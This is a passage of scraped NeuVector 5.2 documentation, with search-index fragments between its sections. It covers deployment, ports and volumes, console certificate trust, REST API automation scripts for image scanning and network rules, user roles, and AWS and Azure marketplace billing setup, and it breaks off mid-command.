Each type of NeuVector container has a unique purpose and may require special performance or node selection requirements for optimum operation.  The NeuVector open source images are hosted on Docker Hub at /neuvector/{image name}.  See the Onboarding/Best Practices section to download an on boarding guide.  Deploy using Kubernetes, OpenShift, Rancher, or other Kubernetes-based tools​  To deploy NeuVector using Kubernetes, OpenShift, Rancher or other orchestration tools, see the preparation steps and sample files in the section Deploying NeuVector. This deploys manager, controller, scanner, and enforcer containers. For simple testing using the NeuVector Allinone container, see the section Special Use Cases with Allinone.  NeuVector supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm.  Automated deployments are supported using Helm, Red Hat/Community Operators, the rest API, or a Kubernetes ConfigMap. See the section Deploy Using ConfigMap for more details on automating deployment.  Deploy using Docker Native​  Before you deploy NeuVector with docker run or compose, you MUST set the CLUSTER_JOIN_ADDR to the appropriate IP address. Find the node IP address, node name (if using a name server, or node variable (if using orchestration tools) for the allinone (controller) to use for the “node IP” in the docker-compose files for both allinone and enforcer. For example:  - CLUSTER_JOIN_ADDR=192.168.33.10   For Swarm-Based deployments, also add the following environment variable:  - NV_PLATFORM_INFO=platform=Docker   See the section Deploying NeuVector -&gt; Docker Production Deployment for instructions and examples.  Backing Up Configuration Files​  By default NeuVector stores various config files in /var/neuvector/config/backup on the Controller or Allinone node.  This volume can be mapped to persistent storage to maintain configuration. Files in the folder may need to be deleted in order to start fresh.  Volume Mapping​  Make sure volumes are mapped properly. NeuVector requires these to operate (/var/neuvector is only required on controller/allinone). For example:  volumes: - /lib/modules:/lib/modules:ro - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   Also, you may need to ensure that other tools are not blocking access to the docker.sock interface.  Ports and Port Mapping​  Make sure the required ports are mapped properly and open on the host. The Manager or Allinone requires 8443 (if using the console). The Allinone and Controller requires 18300, 18301, 18400, 18401 and optionally 10443, 11443, 20443, 30443. The Enforcer requires 18301 and 18401.  Note: If deploying docker native (including SWARM) make sure there is not any host firewall blocking access to required ports such as firewalld. If enabled, the docker0 interface must be added as a trusted zone for the allinone/controller hosts.  Port Summary​  The following table lists communications from each NeuVector container. The Allinone container combines the Manager, Controller and Enforcer containers so requires the ports listed for those containers.    The following table summarizes the listening ports for each NeuVector container.    Additional Ports​  In version 5.1, a new listener port has been added on 8181 in the controller for local controller communication only.  tcp 0 0 :::8181 :::* LISTEN 8/opa  ","version":"5.2","tagName":"h3"},{"title":"Configuring NeuVector and Accessing the Console","type":0,"sectionRef":"#","url":"/5.2/configuration","content":"Configuring NeuVector and Accessing the Console How to perform initial configurations and access the console.","keywords":"","version":"5.2"},{"title":"5.x Overview","type":0,"sectionRef":"#","url":"/5.2/basics/overview","content":"","keywords":"","version":"5.2"},{"title":"The Full Life-Cycle Container Security Platform​","type":1,"pageTitle":"5.x Overview","url":"/5.2/basics/overview#the-full-life-cycle-container-security-platform","content":" note These docs describe the 5.x (Open Source) version. The 5.x images are accessible from Docker Hub with the appropriate tag, e.g. neuvector/controller:(version). For 4.x versions see the 4.x Docs.

Other features of NeuVector include the ability to quarantine containers and to export logs through SYSLOG and webhooks, initiate packet capture for investigation, and integration with OpenShift RBACs, LDAP, Microsoft AD, and SSO with SAML. Note: Quarantine means that all network traffic is blocked. The container will remain and continue to run - just without any network connections. Kubernetes will not start up a container to replace a quarantined container, as the api-server is still able to reach the container.  ","version":"5.2","tagName":"h3"},{"title":"Security Containers​","type":1,"pageTitle":"5.x Overview","url":"/5.2/basics/overview#security-containers","content":" The NeuVector run-time container security solution contains four types of security containers: Controllers, Enforcers, Managers, and Scanners. A special container called the Allinone is also provided to combine the Controller, Enforcer, and Manager functions all in one container, primarily for docker native deployments.  NeuVector can be deployed on virtual machines or on bare metal systems with a single os.  Controller​  The Controller manages the NeuVector Enforcer container cluster. It also provides REST APIs for the management console. Although typical test deployments have one Controller, multiple Controllers in a high-availability configuration is recommended. 3 controllers is the default in the Kubernetes Production deployment sample yaml.  Enforcer​  The Enforcer is a lightweight container that enforces the security policies. One enforcer should be deployed on each node (host), e.g. as a Daemon set.  note For Docker native (non Kubernetes) deployments the Enforcer container and the Controller cannot be deployed on the same node (except in the All-in-One case below).  Manager​  The Manager is a stateless container that provides a web-UI (HTTPS only) console for users to manage the NeuVector security solution. More than one Manager container can be deployed as necessary.  All-in-One​  The All-in-One container includes a Controller, an Enforcer and a Manager in one package. It's useful for easy installation in single-node or small-scale deployments.  Scanner​  The Scanner is a container which performs the vulnerability and compliance scanning for images, containers and nodes. It is typically deployed as a replicaset and can be scaled up to as many parallel scanners as desired in order to increase the scanning performance. The Controller assigns scanning jobs to each available scanner in a round-robin fashion until all scans are completed. The scanner also contains the latest CVE database and is updated regularly by NeuVector.  Updater​  The Updater is a container which when run, updates the CVE database for NeuVector. NeuVector regularly publishes new scanner images to include the latest CVE for vulnerability scans. The updater re-deploys all scanner pods by taking the deployment to zero and scaling it back up, forcing a pull of an updated scanner image.  Architecture​  Here is a general architecture overview of NeuVector. Not shown is the separate scanner container, which can also be run as a stand-alone pipeline scanner.  ","version":"5.2","tagName":"h3"},{"title":"Deployment Examples​","type":1,"pageTitle":"5.x Overview","url":"/5.2/basics/overview#deployment-examples","content":" For common deployment patterns and best practices see the Onboarding/Best Practices section.  All-in-One and Enforcers​  This deployment is ideal for single-node or small-scale environments, for example for evaluation, testing, and small deployments. An All-in-One container is deployed on one node, which can also be a node with running application containers. An Enforcer can be deployed on all other nodes, with one Enforcer required on each node you wish to protect with NeuVector. This is also useful for native Docker deployments where a controller and enforcer cannot run on the same host.  Controller, Manager and Enforcer Containers​  This is a more generic deployment use case which consists one or more Controllers, one Manager and a set of Enforcers. The Controller and Manager can be deployed on the same node or on different nodes than the Enforcer.  All-in-One Only​  You can deploy just the allinone container for registry scanning, using the Jenkins plug-in, or simple one node testing of NeuVector.  Controller Only​  It is possible to deploy a single Controller container and/or scanner to manage vulnerability scanning outside a cluster, for example for use with the Jenkins plug-in. Registry scanning can also be performed by the Controller using the REST API exclusively, but typically a Manager container is also desired in order to provide console based configuration and results viewing for registry scanning.

In Protect mode (inline firewall), the Enforcer requires CPU and memory to filter connections with deep packet inspection and hold them to determine whether they should be blocked/dropped. Generally, with 1GB of memory and a shared CPU, the Enforcer should be able to handle most environments while in Protect mode. For throughput or latency sensitive environments, additional memory and/or a dedicated CPU core can be allocated to the NeuVector Enforcer container. For performance tuning of the Controller and Scanner for registry scanning, see System Requirements above. For additional advice on performance and sizing, see the Onboarding/Best Practices section. Throughput​ As the chart below shows, basic throughput benchmark tests showed a maximum throughput of 1.3 Gbps PER NODE on a small public cloud instance with 4 CPU cores. For example, a 10 node cluster would then be able to handle a maximum of 13 Gbps of throughput for the entire cluster for services in Protect mode. This throughput would be projected to scale up as dedicated a CPU is assigned to the Enforcer, or the CPU speed changes, and/or additional memory is allocated. Again, the scaling will be dependent on the type of network/application traffic of the workloads. Latency​ Latency is another performance metric which depends on the type of network connections. Similar to throughput, latency is not affected in Monitor mode, only for services in Protect (inline firewall) mode. Small packets or simple/fast services will generate a higher latency by NeuVector as a percentage, while larger packets or services requiring complex processing will show a lower percentage of added latency by the NeuVector enforcer. The table below shows the average latency of 2-10% benchmarked using the Redis benchmark tool. The Redis Benchmark uses fairly small packets, so the the latency with larger packets would expected to be lower.

A possible reason could be that the certificate has not yet been imported into macOS login certificates store. Another possibility is that an existing certificate has not yet been configured to be trusted. This will disallow the user from accepting it and proceeding to the NeuVector login page with the use of Chrome as illustrated with the example shown below:    Corrective steps can be taken to enable Chrome on accepting the self-signed certificate placed on macOS Keychain store. This can be done by configuring the NeuVector’s certificate to be trusted using the Mac’s Keychain Access application. This is with the assumption that the certificate does indeed exists in the macOS Keychain Access store. We will first look at how to export a certificate from an existing NeuVector node from one system, and later can be imported into another system. There are 2 ways to go about exporting the certificate which we will go over below. They are, using the Chrome browser, and using the macOS Keychain Access application.  Certificate export using Chrome​  The screen capture below illustrates how to access the NeuVector certificate using Chrome.    To export the certificate, drag and drop the certificate to a location of choice.    Certificate export using macOS Keychain-Access​  Launch the macOS Keychain Access application by simultaneously entering the keys ⌘ + F using a Mac keyboard, search for Keychain Access, and double click on the application. This launches the Keychain Access application. Select the NeuVector certificate and choose Export “NeuVector” from the dropdown menu. This will allow the export of the certificate to a location of choice.    Launching the macOS Keychain-Access Application​  There are two ways to launch the macOS Keychain Access Application. This can be done by searching from the macOS, which has been described from the steps immediately above, or using the Chrome browser.  Launching Keychain-Access from the Chrome Browser​  Settings &gt; Advanced &gt; Manage certificates    Clicking on the Manage certificates as shown from above launches the Mac’s Keychain Access application as shown below.    Certificate import into the macOS Keychain-Access Store​  Launch the macOS Keychain Access application by simultaneously entering the keys ⌘ + F using a Mac keyboard, search for Keychain Access, and click on the application. Then import the certificate by drag and dropping a NeuVector certificate (example: nvcertificate.cer) into the Certificate right pane of the Keychain Access application. Now that the certificate has been imported, it is not yet trusted. The following is an example showing the default trust settings after a NeuVector’s certificate has been imported into the Keychain Access application.    Notice that none of the parameters have been configured, and it is not trusted by default. It needs to be configured to be trusted to allow the user to access the login page using the Chrome browser.  Enabling trust for the NeuVector Certificate​  The following steps details on how to enable trust for the NeuVector certificate in the Keychain Access store.    Double clicking on the NeuVector certificate from the screen capture above will bring up another popup dialog box that allows the trust permissions to be configured for different parameters. Configure Secure Sockets Layer (SSL) to “Always Trust”.    Close the dialog box and click on ‘Update Settings” after entering the Mac logon user’s password from the following popup dialog box.    This finalizes the trust configurations. Next, clear all Chrome browser’s cache, close all Chrome browsers, and relaunch the Chrome browser. Next visit the NeuVector login page, and upon clicking on the “Advanced” link, the Proceed to … (unsafe) link will be shown. Clicking on the Proceed to … (unsafe) will allow the user to proceed to the username and password login page.

This is why it can't be changed to 443.  If you are trying to access the console from your corporate network. Here is the way to use the ClusterIP service and ingress HTTPS redirect to achieve that.  First, create a certificate for HTTPS termination. Here is an example,  openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj &quot;/CN=mycloud.domain.com&quot; kubectl create secret tls neuvector-ingress-tls -n neuvector --key=&quot;tls.key&quot; --cert=&quot;tls.crt&quot;   Then, use the following yaml file to expose the 443 port that redirects the HTTPS connection to the manager.  apiVersion: v1 kind: Service metadata: name: neuvector-cluster-webui namespace: neuvector spec: ports: - port: 443 targetPort: 8443 protocol: TCP type: ClusterIP selector: app: neuvector-manager-pod --- apiVersion: extensions/v1beta1 kind: Ingress metadata: name: neuvector-ingress-webui namespace: neuvector annotations: ingress.mycloud.net/ssl-services: ssl-service=neuvector-cluster-webui spec: tls: - hosts: - cloud.neuvector.com secretName: neuvector-ingress-tls rules: - host: cloud.neuvector.com http: paths: - path: backend: serviceName: neuvector-cluster-webui servicePort: 443   You will need to change the annotation for the ingress address from ingress.mycloud.net to your appropriate address.  This example uses the URL cloud.neuvector.com. After the ingress service is created, you can find it's external IP. You then can configure the hosts file to point cloud.neuvector.com to that IP. After that, you should be able to browse to https://cloud.neuvector.com (the url you choose to use).  Using SSL Passthrough Instead of Redirect​  To use TLS/SSL passthrough instead of the redirect example above (supported on some ingress controllers such as nginx), make sure the ingress controller is configured appropriated for passthrough, and the appropriate annotation is added to the ingress.

Below are common examples of automation using the REST API. The REST API yaml doc is best viewed in the Swagger 2.0 viewer. The REST API documentation is below in a yaml file which is best viewed in a reader such as swagger.io.  Latest update can be found here. Also in the NeuVector GitHub source code repo. The apis.yaml from the main truck can include unreleased features. It is recommended to download the appropriate released version source code and extract the apis.yaml from the controller/api folder.  important If you are making REST API calls with username/password, please be sure make a DELETE call against /v1/auth when done. There is a maximum of 32 concurrent sessions for each user. If this is exceeded, an authentication failure will occur.  NeuVector also support Response Rules to automate common responses to security events or vulnerabilities detected. Please see the section Security Policy -&gt; Response Rules for more details.  Expose REST API in Kubernetes​  To expose the REST API for access from outside of the Kubernetes cluster, enable port 10443.  apiVersion: v1 kind: Service metadata: name: neuvector-service-rest namespace: neuvector spec: ports: - port: 10443 name: controller protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod   note type: NodePort can also be used instead of LoadBalancer.  note If using type LoadBalancer, set the controllerIP in the examples below to the external IP or URL for the loadbalancer.  Authentication for REST API​  The REST API supports two types of authentication: username/password and token. Both can be configured in Settings -&gt; Users, API Keys &amp; Roles, and be associated with default or custom roles to limit access privileges. The examples below show username/password based authentication where a token is created first, then used in subsequent REST API calls. If using a token, it can be used directly in each REST API call. Note: username based connections have a limited number of concurrent sessions, so it is important to delete the username token as shown below when finished. Token based authentication does not have a limit, but expire according to the time limit selected when created.  For token-based authentication, see the following screen shots and example call. Be sure to copy the secret and token once created, as there is no way to retrieve this after the screen in closed.        Trigger Vulnerability Scanning from a script​  NeuVector can be triggered automatically to scan an image for vulnerabilities. This can be done by configuring a registry/repository to be monitored, using the NeuVector Jenkins plug-in, or using the REST API. Please see the section on Scanning &amp; Compliance for more detail.  The sample script below shows how to remotely pull the container, run it, and scan it. It can be triggered from a Jenkins task (remote shell) or any CI/CD tool. A JSON parser tool (jq) is also used.  Be sure to enter the controller IP address in the script and change the container image name to the one you wish to scan. Also, update the username/password fields.  _curCase_=`echo $0 | awk -F&quot;.&quot; '{print $(NF-1)}' | awk -F&quot;/&quot; '{print $NF}'` _DESC_=&quot;able to scan ubuntu:16.04 image&quot; _ERRCODE_=0 _ERRTYPE_=1 _RESULT_=&quot;pass&quot; # please remember to specify the controller ip address here _controllerIP_=&quot;&lt;your_controller_ip&gt;&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot; _registryURL_=&quot;&quot; _registryUsername_=&quot;&quot; _registryPassword_=&quot;&quot; _repository_=&quot;alpine&quot; _tag_=&quot;latest&quot; curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, &quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` scanning an image ... curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json while [ `wc -c &lt; scan_repository.json` = &quot;0&quot; ]; do echo `date +%Y%m%d_%H%M%S` scanning is still in progress ... sleep 5 curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json done echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 cat scan_repository.json | jq . rm *.json echo `date +%Y%m%d_%H%M%S` [$_curCase_] $_DESC_: $_RESULT_-$_ERRCODE_   note You may need to install jq sudo yum install jq   For Kubernetes based deployments you can set the Controller IP as follows:  _podNAME_=`kubectl get pod -n neuvector -o wide | grep &quot;allinone\\|controller&quot; | head -n 1 | awk '{print $1}'` _controllerIP_=`kubectl exec $_podNAME_ -n neuvector -- consul info | grep leader_addr | awk -F&quot;:| &quot; '{print $3}'`   note In a multiple controller deployment the requests must be sent to a single controller IP so multiple requests for status of long running image scans go to the controller performing the scan.

The following sample creates a new Group based on the container label nv-service-type=data, and another Group for label nv-service-type=website. A rule is then created to allow traffic from the wordpress container to the mysql container using only the mysql protocol.  Be sure to update the username and password for access to the controller.  #!/bin/sh TOKEN_JSON=$(curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;) _TOKEN_=`echo $TOKEN_JSON | jq -r '.token.token'` curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;name&quot;: &quot;mydb&quot;, &quot;criteria&quot;: [{&quot;value&quot;: &quot;data&quot;, &quot;key&quot;: &quot;nv.service.type&quot;, &quot;op&quot;: &quot;=&quot;}]}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/group&quot; curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;name&quot;: &quot;mywp&quot;, &quot;criteria&quot;: [{&quot;value&quot;: &quot;website&quot;, &quot;key&quot;: &quot;nv.service.type&quot;, &quot;op&quot;: &quot;=&quot;}]}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/group&quot; curl -k -X &quot;PATCH&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;insert&quot;: {&quot;rules&quot;: [{&quot;comment&quot;: &quot;Custom WP Rule&quot;, &quot;from&quot;: &quot;mywp&quot;, &quot;applications&quot;: [&quot;MYSQL&quot;], &quot;ports&quot;: &quot;any&quot;, &quot;to&quot;: &quot;mydb&quot;, &quot;action&quot;: &quot;allow&quot;, &quot;id&quot;: 0}], &quot;after&quot;: 0}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/policy/rule&quot; curl -k -X &quot;DELETE&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;   If the Groups already exist in NeuVector then the new rule can be created, skipping the Group creation steps.

Users and Roles menu enables management of users as well as roles. Each user is assigned to a predefined or custom role. Users can be mapped to roles through group integration with LDAP/AD or other SSO system integrations. See the Enterprise Integration section for detailed instructions for each type or directory or SSO integration.  Users​  Users can be configured directly in NeuVector or integrated through directories/SSO. To create a new user in NeuVector go to Settings -&gt; Users &amp; Roles and add the user. Select the role of the user from the predefined roles, or see below to create a custom role.  The default password requirement is minimum 8 characters length, 1 uppercase letter, 1 lowercase letter, 1 numeric character. These and other requirements can be changed by an admin in Settings -&gt; Users under Authentication and Security Policies.  Namespace Restricted Users​  Users can be restricted to certain namespaces. First select the global role (use 'none' if no global role is desired), then click on the Advanced Settings.  Select a role name from the list of roles, then enter the namespace(s) which the user allowed. For example, below is a global reader (view only) role, but for namespace 'demo' the user has admin permissions and for the namespace 'staging' the user has CI/Ops permissions. If a custom role was previously configured that can also be selected.    note If a user has previously logged in through an enterprise integration, their Identify Provider (e.g. OpenID Connect) will be listed. A user can be promoted to a Federated admin if multi-cluster management is in use by selecting the user and editing.  note When a namespace restricted user configures a registry in Assets in NeuVector, only users with access to that namespace can see/scan that registry. Global users will be able to see/manage that registry, but not any users with restricted namespaces / role.  Roles​  Preconfigured roles include Admin, Reader, and CI/Ops. To create a new custom role, select the Roles tab in Settings -&gt; Users &amp; Roles. Name the role and add the appropriate read or write permission to it.    RBAC Permissions​  Admission Control. Manage admission control rules.Audit Events. View Notification -&gt; Risk reports logs.Authentication. Enable directory and SSO (oidc/saml/ldap) configuration.Authorization. Create new users and custom roles.CI Scan. Allows scanning on images through REST API. Useful for configuring a build-phase plug-in scanner user.Compliance.

Manage Policy menus for Policy Mode (Discover, Monitor, Protect), Network Rules, Process Rules, File Access Rules, DLP, Packet capture, Response Rules.Runtime Scan. Trigger and view run-time vulnerability scanning of containers/nodes/platform.Security Event. Access Notifications -&gt; Security Events logs.System Config. Allow configuration of Settings -&gt; Configuration.  Mapping Groups to Roles and Namespaces​  Groups can be mapped to preset or custom roles in NeuVector. In addition, a role can be restricted to one or more namespaces.  In the LDAP/AD, SAML, or OIDC configuration in Settings, the last section of the configuration screen maps Groups to Roles and Namespaces. First select a default role, if any, for mapping.    To map a group to a role and namespace, click Add to create a new mapping. Select a global role or none. If admin or FedAdmin is selected, this gives write access to all namespaces. If a different role is selected, it can be further restricted by selecting the desired namespace(s).    The following example provides some possible mappings. Demo_admin can read/view all namespaces but has admin rights to the demo and demo2 namespaces. System_admin only has admin rights to the kube-system namespace. And fed_admins has the preset fedAdmin role which gives write access to all resources across multiple clusters.    important If the user is in multiple groups, the role will be 'first matched' in the order listed and group's role assigned. Please adjust the order of configuration for proper behavior by dragging and dropping the mappings to the appropriate order in the list.  Multi-Cluster FedAdmin and Admin Roles for Primary and Remote Management​  When a cluster is promoted to be a Primary cluster, the admin becomes a FedAdmin automatically. The FedAdmin can perform operations on the primary such as generate a federation token for connecting a remote cluster as well as creating federated security rules such as network, process, file, and admission control rules.  Multi-cluster management roles are as follows:  On any cluster, a local admin or a Rancher SSO admin can promote the cluster to become a primary.Ldap/SSO/SAML/OIDC users with admin roles are not able to promote a cluster to primary.Only the FedAdmin can generate the token required to join a remote cluster to the primary.Any admin, including ldap/sso/saml/oidc users can join a remote cluster to the primary if they have the token.Only the FedAdmin can create a new user as a FedAdmin (or FedReader) or assign the FedAdmin (or FedReader) role to an existing user (including ldap/sso/saml/oidc users).

","version":"5.2","tagName":"h3"},{"title":"Supported Configurations​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/5.2/deploying/azuremarketplace#supported-configurations","content":" The marketplace PAYG listing supports deployment on supported target environments only. As of the July release, only AKS is supported for the billing adapter (see below options for other environments such as Rancher, Kubernetes, OpenShift etc). Each cluster can report its usage (nodes) independently, or an aggregated node count for a multi-cluster deployment can be reported. An aggregated, multi-cluster deployment can take advantage of the volume discount tiers offered by pooling all nodes across clusters into a single usage billing calculation.  note All clusters in PAYG billing (single, primary, remotes) must be running NeuVector version 5.2.2 or later.  Single Cluster Usage Billing​  Each cluster onto which you have deployed the PAYG billing adapter through the marketplace will report usage information for your Azure account.  Multi-cluster Usage Billing​  To be able to aggregate the node counts from multiple clusters in order to take advantage of volume discounts, the clusters must have been configured for Multi-cluster federation as described in the NeuVector docs. NeuVector on the Primary cluster MUST have been deployed through the Azure Marketplace, with the billing adapter installed in the primary cluster, in order to be able to report the primary and all downstream remote cluster node counts. Do not deploy NeuVector through the marketplace on downstream remote clusters. Use standard deployment methods (Helm, Operator, kubectl etc) described in the NeuVector docs on remote clusters.  Enabling PAYG NeuVector Prime Billing for Existing NeuVector Clusters​  There are several options to enable NeuVector Prime billing on existing NeuVector clusters.  Option 1: The existing cluster must be on a supported PAYG platform. Backup the NeuVector configuration of the existing cluster, remove the NeuVector deployment, then deploy NeuVector through the Azure marketplace. After successful deployment, import the backup configuration. Note: It is recommended that the existing cluster be running version NeuVector 5.2.2 or later before the backup and removal. Option 2: Add the existing cluster as a federated remote cluster to a (existing or newly deployed) primary cluster which already has PAYG billing deployed on it. In this case, the existing cluster can be on any platform supported by NeuVector.  Enabling PAYG NeuVector Prime Billing for Rancher, OpenShift, Tanzu, or other NeuVector supported clusters​  Although PAYG billing deployment is supported on a limited set of Azure platforms (only AKS at initial November 2023 release), billing for other supported NeuVector platforms can be accomplished using the multi-cluster federation configuration. As long as the primary cluster has the PAYG billing deployment of NeuVector, downstream clusters can be any supported NeuVector clusters such as Rancher, Kubernetes, OpenShift, or Tanzu. Downstream clusters can even be on-premise, or on other clouds as long as the remote cluster can be federated to the primary (with appropriate network access).  For Rancher managed downstream clusters with SSO to NeuVector, these clusters can be federated to a non-Rancher primary cluster which is deployed through the Azure marketplace in order to benefit from consolidated multi-cluster billing.

This must be deployed, together with NeuVector from the Azure Marketplace listing for NeuVector. To deploy the billing adapter and NeuVector see the Usage instructions.  Setting the Admin Password​  It is required to set the admin password in the Azure create offer, &quot;NeuVector Configuration&quot; section. See the Usage instructions on the Azure marketplace listing for NeuVector for instructions.  Console Login through Load Balancer​  If the manager service type was set to Load Balancer during install, an external IP (URL) has been assigned for logging into the NeuVector console. Typically, this URL is accessible from the internet, but your organization may have placed additional restrictions on external access to your cluster. To see the load balancer, type:  kubectl get svc -n neuvector neuvector-service-webui   To get the full login url, type:  SERVICE_IP=$(kubectl get svc --namespace neuvector neuvector-service-webui -o jsonpath=&quot;{.status.loadBalancer.ingress[0].ip}&quot;) echo https://$SERVICE_IP:8443   And you will see something like:  https://&lt;$SERVICE_IP&gt;:8443   This is how you can access the NeuVector console from your browser on the default port 8443.  Once logged in, you can begin to navigate and configure NeuVector.

This is a web-based service for creating, viewing, and managing support requests. The actual link for submitting your support bundle as described below can be found here.  The SCC portal will require you to upload a Support Configuration bundle in order to verify your eligibility as well as provide cluster information required to start investigations. To download the support config, please go to Settings -&gt; Configuration at the bottom of the page for the cluster in question.

As of the July release, only EKS is supported for the billing adapter (see below options for other environments such as Rancher, Kubernetes, OpenShift etc). Each cluster can report its usage (nodes) independently, or an aggregated node count for a multi-cluster deployment can be reported. An aggregated, multi-cluster deployment can take advantage of the volume discount tiers offered by pooling all nodes across clusters into a single usage billing calculation.  note All clusters in PAYG billing (single, primary, remotes) must be running NeuVector version 5.2.0 or later.  Single Cluster Usage Billing​  Each cluster onto which you have deployed the PAYG billing adapter through the marketplace will report usage information for your AWS account.  Multi-cluster Usage Billing​  To be able to aggregate the node counts from multiple clusters in order to take advantage of volume discounts, the clusters must have been configured for Multi-cluster federation as described in the NeuVector docs. NeuVector on the Primary cluster MUST have been deployed through the AWS Marketplace, with the billing adapter installed in the primary cluster, in order to be able to report the primary and all downstream remote cluster node counts. Do not deploy NeuVector through the marketplace on downstream remote clusters. Use standard deployment methods (Helm, Operator, kubectl etc) described in the NeuVector docs on remote clusters.  Enabling PAYG NeuVector Prime Billing for Existing NeuVector Clusters​  There are several options to enable NeuVector Prime billing on existing NeuVector clusters.  Option 1: The existing cluster must be on a supported PAYG platform. Backup the NeuVector configuration of the existing cluster, remove the NeuVector deployment, then deploy NeuVector through the AWS marketplace. After successful deployment, import the backup configuration. Note: It is recommended that the existing cluster be running version NeuVector 5.2.0 or later before the backup and removal. For Helm based deployments, this is a sample Helm upgrade command (replacing account ID, IAM role name, previous helm version values file etc):  helm upgrade -n neuvector neuvector oci://709825985650.dkr.ecr.us-east-1.amazonaws.com/suse/neuvector-csp-billing-adapter-llc/core --version 2.4.30002023052201 --create-namespace \\ --set awsbilling.accountNumber=$AWS_ACCT_ID,awsbilling.roleName=$IAM_ROLE_NAME \\ --set awsbilling.enabled=true,containerd.enabled=true -f values-x.y.z.yaml   Option 2: Add the existing cluster as a federated remote cluster to a (existing or newly deployed) primary cluster which already has PAYG billing deployed on it. In this case, the existing cluster can be on any platform supported by NeuVector.  Enabling PAYG NeuVector Prime Billing for Rancher, OpenShift, Tanzu, or other NeuVector supported clusters​  Although PAYG billing deployment is supported on a limited set of AWS platforms (only EKS at initial July release), billing for other supported NeuVector platforms can be accomplished using the multi-cluster federation configuration. As long as the primary cluster has the PAYG billing deployment of NeuVector, downstream clusters can be any supported NeuVector clusters such as Rancher, Kubernetes, OpenShift, or Tanzu. Downstream clusters can even be on-premise, or on other clouds as long as the remote cluster can be federated to the primary (with appropriate network access).  For Rancher managed downstream clusters with SSO to NeuVector, these clusters can be federated to a non-Rancher primary cluster which is deployed through the AWS marketplace in order to benefit from consolidated multi-cluster billing.

This must be deployed, together with NeuVector from the AWS Marketplace listing for NeuVector. To deploy the billing adapter and NeuVector see the Usage instructions for your region in the marketplace listing above.  The helm install command uses defaults in the values.yaml file. Important defaults to check are the manager service type (LoadBalancer) and container run-time (containerd - which is the typical default for EKS clusters). The default admin username is disabled, and users are required to set a username and password through a secret prior to deployment.  Setting the Admin Username and Password​  It is required to set the admin username and password as a Kubernetes secret prior to deployment.  kubectl create secret generic neuvector-init --from-file=userinitcfg.yaml -n neuvector   note The above step is mandatory, otherwise an admin user will not be created upon NeuVector deployment, making the NeuVector deployment unmanageable.

Console Login through Load Balancer​  If the manager service type was set to Load Balancer during install, an external IP (URL) has been assigned for logging into the NeuVector console. Typically, this URL is accessible from the internet, but your organization may have placed additional restrictions on external access to your cluster. To see the load balancer, type:  kubectl get svc -n neuvector neuvector-service-webui   To get the full login url, type:  SERVICE_IP=$(kubectl get svc --namespace neuvector neuvector-service-webui -o jsonpath=&quot;{.status.loadBalancer.ingress[0].hostname}&quot;) echo https://$SERVICE_IP:8443   And you will see something like:  https://a2647ecdxx33498948a70eea84c5-18386345695.us-west-2.elb.amazonaws.com:8443   This is how you can access the NeuVector console from your browser on the default port 8443.  Once logged in, you can begin to navigate and configure NeuVector.  note The NeuVector scanner image is updated daily with a new CVE database on the NeuVector docker hub registry. It is recommended that the image path be changed to allow for automated daily updates by modifying the scanner and updater image paths AFTER successful initial deployment. For example: kubectl set image deploy/neuvector-scanner-pod 